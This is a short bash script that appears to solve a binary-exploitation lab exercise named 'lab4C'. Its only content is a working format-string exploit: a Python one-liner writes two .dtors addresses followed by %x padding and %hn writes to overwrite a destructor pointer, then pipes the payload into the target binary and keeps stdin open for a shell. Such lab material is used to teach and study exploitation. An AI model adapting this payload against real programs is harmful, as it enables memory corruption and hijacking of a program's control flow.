#!/bin/bash

# .dtor overwrite
(python -c 'a="\xe4\x9d\x04\x08JUNK\xe6\x9d\x04\x08%35551x%37$hn%32025x%39$hn\npassword";print a'; cat) | ./lab4C
